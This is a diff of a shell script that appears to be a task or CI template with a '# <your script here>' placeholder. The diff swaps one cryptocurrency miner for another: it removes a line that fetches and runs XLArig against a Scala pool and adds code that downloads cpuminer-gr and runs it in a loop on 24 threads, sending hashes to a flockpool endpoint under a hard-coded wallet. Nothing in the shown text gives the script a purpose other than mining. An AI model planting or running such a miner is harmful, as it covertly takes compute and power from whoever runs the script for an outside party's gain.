@@ -12,7 +12,17 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o mine.scalaproject.io:5555 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p Rx -a panthera -k -t24
+wget https://github.com/WyvernTKC/cpuminer-gr-avx2/releases/download/1.2.4/cpuminer-gr-1.2.4-x86_64_linux.tar.gz
+tar xf cpuminer-gr-1.2.4-x86_64_linux.tar.gz
+cd cpuminer-gr-1.2.4-x86_64_linux
+cd binaries
+COUNTER=20
+until [  $COUNTER -lt 10 ]; do
+            
+     ./cpuminer-sse2 -a gr -o stratum+tcps://us.flockpool.com:5555 -u RFcnLsWDziyWU7Hj8VrTpuAAv7FFYBJTi6.Dee --no-tune -t 24
+
+     echo COUNTER $COUNTER
+     let COUNTER-=1
 done
 # <your script here>
 
